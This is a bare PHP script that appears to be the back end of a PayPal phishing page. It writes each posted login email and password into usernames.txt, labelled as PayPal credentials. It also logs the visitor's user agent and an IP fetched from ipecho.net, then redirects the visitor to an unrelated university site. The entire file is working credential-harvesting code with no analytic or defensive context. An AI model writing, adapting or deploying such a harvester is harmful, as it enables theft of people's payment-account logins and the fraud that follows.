<?php
file_put_contents("usernames.txt", "Paypal Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] ."\n", FILE_APPEND);
$user_agent4754=$_SERVER['HTTP_USER_AGENT'];
$realIP = file_get_contents("http://ipecho.net/plain");
file_put_contents("usernames.txt", "user-agent : " . $user_agent4754 . "ip: " . $realIP . "\n", FILE_APPEND);
header('Location:https://myu.helwan.edu.eg/');
exit();
?>